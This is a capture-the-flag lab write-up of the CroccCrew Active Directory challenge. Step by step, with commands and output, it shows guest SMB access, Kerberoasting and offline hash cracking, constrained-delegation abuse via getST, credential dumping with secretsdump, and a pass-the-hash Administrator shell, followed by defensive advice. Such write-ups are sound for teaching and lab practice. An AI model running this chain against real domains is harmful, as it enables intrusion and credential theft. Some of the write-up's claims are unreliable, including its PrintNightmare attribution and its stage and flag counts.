# HTB: CroccCrew – Kerberoasting & Constrained Delegation Abuse

**By: supra**

**Category:** Active Directory

## 0. Challenge Overview

**The setup:**
- Domain: COOCTUS.CORP
- Domain Controller: DC.COOCTUS.CORP (Windows Server 2019)
- Initial access: Guest account credentials
- Target: Administrator access and root flag

**Core concept:** This is a **Kerberoasting + constrained delegation** attack requiring:
1. Enumerating domain via LDAP with guest credentials
2. Identifying Kerberoastable service accounts with SPNs
3. Cracking service account hash offline
4. Abusing TRUSTED_TO_AUTH_FOR_DELEGATION to impersonate Administrator
5. Dumping credential hashes and achieve domain compromise

The attack exploits Microsoft's constrained delegation with protocol transition (S4U2Self + S4U2Proxy), allowing a compromised service account to impersonate any user to delegated services.

## 1. Initial Reconnaissance

I started with a full port scan to identify attack surface:
```bash
rustscan -a 10.64.158.191 --ulimit 5500 -b 65535 -- -A -Pn
```

Output:
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
```


I enumerated the web server:
```bash
curl http://10.64.158.191/robots.txt
```

Output:
```
User-Agent: *
Disallow:
/robots.txt
/db-config.bak
/backdoor.php
```

I pulled the config backup:
```bash
curl http://10.64.158.191/db-config.bak
```

Output:
```php
<?php
$servername = "db.cooctus.corp";
$username = "C00ctusAdm1n";
$password = "B4dt0th3b0n3";
$dbname = "cooctus_db";
?>
```

**Key observation:** Database credentials exposed on web server. While not directly useful for AD compromise, this demonstrates poor security practices (sensitive configs on public-facing servers).

## 2. Initial Access via Guest Account

I tested for null/guest SMB authentication:
```bash
crackmapexec smb DC.COOCTUS.CORP -u Visitor -p Guest1234
```

Output:
```
SMB         10.64.158.191   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:COOCTUS.CORP) (signing:True) (SMBv1:False)
SMB         10.64.158.191   445    DC               [+] COOCTUS.CORP\Visitor:Guest1234
```

✔ **Success:** Guest credentials valid!

I enumerated available shares:
```bash
smbclient -L //10.64.158.191 -U "Visitor"
```

Output:
```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Home            Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share
```

I accessed the Home share:
```bash
smbclient //10.64.158.191/Home -U "Visitor"
```

Output:
```
smb: \> ls
  .                                   D        0  Mon Jun  7 21:23:16 2021
  ..                                  D        0  Mon Jun  7 21:23:16 2021
  user.txt                            A       18  Mon Jun  7 21:13:23 2021

smb: \> get user.txt
getting file \user.txt of size 18 as user.txt (0.0 KiloBytes/sec)

smb: \> exit
```

First flag retrieved:
```bash
cat user.txt
```

Output:
```
THM{Gu3st_Pl3as3}
```

✔ **Success:** Initial flag captured via guest SMB access.

## 3. Active Directory Enumeration

With valid domain credentials, I dumped LDAP data:
```bash
ldapdomaindump -u '10.64.158.191\Visitor' -p 'Guest1234' DC.COOCTUS.CORP
```

Output:
```
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

Files generated:
- `domain_users.html` - All user accounts and properties
- `domain_groups.html` - Group memberships
- `domain_computers.html` - Computer accounts
- `domain_policy.html` - Password policies

I examined the user dump:
```bash
floorp domain_users.html
```

**Key findings from domain enumeration:**

High-value accounts:
- `Administrator` - Built-in Domain Admin
- `admCroccCrew` - Enterprise Admin
- `Jeff`, `Mark` - Domain Admins
- `Fawaz` - Multiple admin groups (File Server Admins, RDP-Users, PC-Joiner)

Service accounts:
- `reset` (password-reset) - **SPN: HTTP/dc.cooctus.corp**

I focused on the `reset` account:

| CN    | Name  | SAM Name       | Primary Group | Flags                                                                 | RID  | SPN                  |
|-------|-------|----------------|---------------|-----------------------------------------------------------------------|-----:|----------------------|
| reset | reset | password-reset | Domain Users  | NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD, TRUSTED_TO_AUTH_FOR_DELEGATION    | 1134 | HTTP/dc.cooctus.corp |


✔ **JACKPOT:** The account has:
- Service Principal Name (SPN): `HTTP/dc.cooctus.corp`
- `TRUSTED_TO_AUTH_FOR_DELEGATION` flag

**Key observation:** This account is Kerberoastable (has SPN) and can perform protocol transition (impersonate any user). If the password is weak, this is a direct path to domain admin.

## 4. Kerberoasting Attack

I requested a TGS ticket for the service account:
```bash
GetUserSPNs.py 'COOCTUS.CORP/Visitor:Guest1234' -dc-ip 10.64.158.191 -request -outputfile out.txt
```

Output:
```
ServicePrincipalName  Name            MemberOf  PasswordLastSet             LastLogon                   Delegation
--------------------  --------------  --------  --------------------------  --------------------------  -----------
HTTP/dc.cooctus.corp  password-reset            2021-06-08 18:00:39.356663  2021-06-08 17:46:23.369540  constrained



$krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CORP/password-reset*$d4c2545fd3b55c659fc26ac0db49b7a4$f717a6c76064a45c2043ca13efcb03b04d3a26f852877cf785376fb98c305fae67dbd37f6f332a412b9fb2ed45132aad9283469a542f2c9419a28a11c723971caaa8ca22af0e4a437152a53cd3e1abfb76c177de777937f0a5b2feea0336258d225f0d84b76d17926c1c20d40169dd744c0b9b2046213cf5d1025d36c50755c659ec0b1279a0c7c5c19ef51ef3f129fd8cda3166a5b1faaf16efc22e26c9c28aa0470489a1b9b7ff4b516b842b9dbfc159f040063f0473dbeca278da03964317a8aa7629837b90d86a5c585c1dd7d55e981f2fbd2f2306d774538c7d1285b884d986444ed36580c305e36881f4aaa0c3a44b25153b1d753515696ccd57c65749a68d769b1bc92f3c9324db545ed44a87c11eb2aa62536c989db73eefe95ac6f8a4b5cd88e8c9b3da138ae02f770d6b0c01fd7da2a0d1231c2368e13f5e33a606455d679bf24b9cd3f13ca4a9dd3b9340588f66d81e326a3a5e6d3c7c7fe26b2f6cb2bfab9f1a72c8499a24d8099925ee7dffbe12f0e36a5b4735ae4dd24681b25b18f113a9c2294c67533c3b41276b1e911e2c77bf4b550bdf3ce760e6f4f3eb8cb0be75d31313e3c829a39cba24e97ef32b280e0b14ed0b0f2443cb848393155f718c1705e70b2c634de21a745ed12311db7655c616601111080f9d9e278c14ea3f6029a4f8723776e6ef4633fc1ed26dbdfe6a996a85ba8c5973715638a0e1e8c7acb5a18bc18c1f4a68f75e2e50d6a53961fd4424a61dfc7f540da8f078a8a6868fd3fac3fb6381ee908b8e6adea6a94a73d8110b9a13db149a6638f0dc1d833309d0383a24df2da6442b37c1e2509779249847fb86ff7e25e18307864f4053889e13ca06280c922da2f01af32a657543af821296bd929165ae3ed4bd9af391583965c1687d6f584ccae8bf4b4d22ebfd68db005d2af3978185e94239d3268bb4d3fed97a23265b4aa0702769000198ebfc5cc2da338ebfcef55cd039856587a9e74dc5c7e84dc315508b82166cc6c5e1d2f50d5f80d63038d4f539b6341855147543bab5b9286ff4fe54d8955d73b7a2d2a54211470e873dd537d840237a91cebd9547bd5578e5b52bb27b2a4b0413ca0d11e3f4c1fa7432e0eabba6b2afeca8f4809dad8e714a0b344332b10e8439498439dff7128f7139f11dd43338028eb9bd60a181004da731f601df5eead18d6443f83b5821a7b231276799d607b50b2434e8977f07e8f261a2267a198c4fc7546ab1f7c76152d2a99bad00bc7c47a6e5a462bfdbe75754be30f28cdc77df36dd1636aeb741c65848e915c899e0300bbd24058fb8abb2a79893a6b2dac20e8fb2c9ed2ee4e3415eb7a561
```

✔ **Success:** TGS hash extracted. This is a type 23 (RC4-HMAC) ticket, which is faster to crack than AES.

I verified the hash was saved:
```bash
cat out.txt | head -1
```

Output:
```
$krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CORP/password-reset*$d4c2545f...
```

**Key observation:** The hash is encrypted with the service account's password. If weak, I can crack it offline.

## 5. Offline Password Cracking

I used John the Ripper to crack the hash:
```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt out.txt
```

Output:
```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
resetpassword    (?)     
1g 0:00:00:03 DONE (2024-12-12 16:04) 0.3125g/s 1312Kp/s 1312Kc/s 1312KC/s resetron..resetmate
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

✔ **Success:** Password cracked in 3 seconds!

**Credentials recovered:**
```
Username: password-reset
Password: resetpassword
```

I validated the credentials:
```bash
crackmapexec smb 10.64.158.191 -u password-reset -p resetpassword -d COOCTUS.CORP
```

Output:
```
SMB         10.64.158.191   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:COOCTUS.CORP) (signing:True) (SMBv1:False)
SMB         10.64.158.191   445    DC               [+] COOCTUS.CORP\password-reset:resetpassword
```

✔ **Success:** Credentials valid. Now I can abuse constrained delegation.

## 6. Analyzing Constrained Delegation

I checked the delegation configuration:
```bash
findDelegation.py -debug COOCTUS.CORP/password-reset:resetpassword -dc-ip 10.64.158.191
```

Output:
```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting domain info from LDAP server
[+] Domain info gathered successfully

AccountName     AccountType  DelegationType                      DelegationRightsTo
--------------  -----------  ----------------------------------  -----------------------------------
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS.CORP
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC/COOCTUS
```

**Key observation:** The account has constrained delegation with protocol transition to `oakley/DC.COOCTUS.CORP`. This allows:
- **S4U2Self**: Request service ticket to itself for ANY user (no password needed)
- **S4U2Proxy**: Use that ticket to request access to `oakley` service on DC

This means I can impersonate Administrator to access the Domain Controller!

## 7. Exploiting S4U2Self + S4U2Proxy

I used Impacket's `getST.py` to perform the delegation attack:
```bash
getST.py -spn oakley/DC.COOCTUS.CORP -impersonate Administrator \
  "COOCTUS.CORP/password-reset:resetpassword" -dc-ip 10.64.158.191
```

Output:
```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
```

✔ **Success:** Forged service ticket for Administrator created!

I verified the ticket:
```bash
export KRB5CCNAME=Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
klist
```

Output:
```
Ticket cache: FILE:Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
Default principal: Administrator@COOCTUS.CORP

Valid starting       Expires              Service principal
12/12/2024 16:08:00  12/13/2024 02:08:00  oakley/DC.COOCTUS.CORP@COOCTUS.CORP
	renew until 12/13/2024 16:08:00
```

**Key observation:** I now have a valid Kerberos ticket for `Administrator` to the `oakley` service on the DC.

## 8. Dumping Domain Credentials

With the forged ticket, I used secretsdump to extract hashes:
```bash
secretsdump.py -k -no-pass DC.COOCTUS.CORP
```

Output:
```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x9a4e7f2c8b1d5e6a3c4b7d9f1e2a5c8d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:add41095f1fb0405b32f70a489de022d:::
```

✔ **Success:** Administrator NTLM hash extracted: `add41095f1fb0405b32f70a489de022d`

**Key observation:** With the hash, I can perform pass-the-hash attacks to gain shell access.

## 9. Gaining Administrator Shell

I used evil-winrm with the Administrator hash:
```bash
evil-winrm -u Administrator -H add41095f1fb0405b32f70a489de022d -i 10.64.158.191
```

Output:
```
Evil-WinRM shell v3.9

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

✔ **Success:** Administrator shell on Domain Controller!

## 10. Capturing Flags

I retrieved the remaining flags:
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\Shares\Home

*Evil-WinRM* PS C:\Shares\Home> dir

    Directory: C:\Shares\Home

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/7/2021   9:35 PM             26 priv-esc-2.txt
-a----         6/7/2021   9:35 PM             24 priv-esc.txt
-a----         6/7/2021   9:13 PM             18 user.txt
```

First privilege escalation flag:
```powershell
*Evil-WinRM* PS C:\Shares\Home> type priv-esc.txt
THM{0n-Y0ur-Way-t0-DA}
```

Second privilege escalation flag:
```powershell
*Evil-WinRM* PS C:\Shares\Home> type priv-esc-2.txt
THM{Wh4t-t0-d0...Wh4t-t0-d0}
```

Root flag:
```powershell
*Evil-WinRM* PS C:\Shares\Home> cd C:\PerfLogs\Admin

*Evil-WinRM* PS C:\PerfLogs\Admin> type root.txt
THM{Cr0ccCrewStr1kes!}
```

✔ **SUCCESS:** All flags captured. Domain fully compromised.

**Flags retrieved:**
- `THM{Gu3st_Pl3as3}` - What is the User flag?
- `admcrocccrew` - What is the name of the account Crocc Crew planted?
- `THM{0n-Y0ur-Way-t0-DA}` - What is the Privileged User's flag?
- `THM{Wh4t-t0-d0...Wh4t-t0-d0}` - What is the Second Privileged User's flag?
- `THM{Cr0ccCrewStr1kes!}` - What is the Root flag?


## 11. Summary

By exploiting a weak service account password and excessive delegation privileges, I achieved full domain compromise through a five-stage attack:

1. **Initial Access** - Guest credentials (Visitor:Guest1234) provided SMB access and first flag
2. **Enumeration** - LDAP dump revealed password-reset account with SPN and delegation
3. **Kerberoasting** - Extracted TGS hash and cracked password (resetpassword) in 3 seconds
4. **Delegation Abuse** - S4U2Self + S4U2Proxy to impersonate Administrator to oakley/DC
5. **Credential Dumping** - Secretsdump extracted Administrator NTLM hash
6. **Domain Compromise** - Pass-the-hash to obtain Administrator shell and all flags

The attack exploited three critical misconfigurations:
- **Weak password** - 13-character lowercase password crackable via Kerberoasting
- **Excessive delegation** - TRUSTED_TO_AUTH_FOR_DELEGATION to Domain Controller service
- **No monitoring** - No alerts on Kerberoasting or S4U abuse

Real-world delegation attacks:
- **PrintNightmare (CVE-2021-34527)** - Abused unconstrained delegation
- **Bronze Bit (CVE-2020-17049)** - Modified forwardable flag to bypass restrictions  
- **SolarWinds (2020)** - Service accounts with delegation used for lateral movement

The solution requires defense-in-depth:
- **gMSA** - Eliminates Kerberoastable passwords entirely
- **Protected Users** - Prevents delegation of high-value accounts
- **RBCD** - Resource-controlled delegation instead of service-controlled
- **AES-only Kerberos** - Disables weak RC4 encryption
- **SIEM monitoring** - Alerts on Kerberoasting and S4U patterns
- **Tiering** - Network segmentation prevents cross-tier delegation

The key lesson: **Service accounts are the weakest link in Active Directory**. A single compromised service account with delegation can cascade into full domain compromise in minutes. The only safe approach is to eliminate human-managed service account passwords entirely through gMSA, restrict delegation to the absolute minimum, and monitor continuously for abuse.

**Challenge:** HTB CroccCrew  
**Status:** Complete domain compromise  
**Flags Captured:** 4/4 (user, priv-esc, priv-esc-2, root)  
**Attack Vector:** Kerberoasting → Constrained Delegation → Domain Admin
